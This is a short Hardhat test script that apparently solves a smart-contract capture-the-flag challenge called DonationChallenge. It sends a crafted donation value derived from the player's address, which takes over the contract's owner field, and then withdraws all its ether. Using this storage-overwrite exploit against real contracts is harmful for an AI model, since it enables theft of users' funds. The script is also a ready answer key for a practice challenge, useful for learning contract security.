import { expect } from "chai"
import { ethers } from "hardhat"

describe("donation", function () {
  it("should steal the candidate's ether", async function () {
    const chalAddr = ""

    const chalName = "DonationChallenge"
    const chal = await ethers.getContractAt(chalName, chalAddr)

    const player = (await ethers.getSigners())[0]
    const value = BigInt(player.address) / (10n**36n)

    const tx1 = await chal.donate(player.address, {value: value})
    await tx1.wait()

    expect(await chal.owner()).to.equal(player.address)

    const tx2 = await chal.withdraw()
    await tx2.wait()

    expect(await chal.isComplete()).to.be.true
  })
})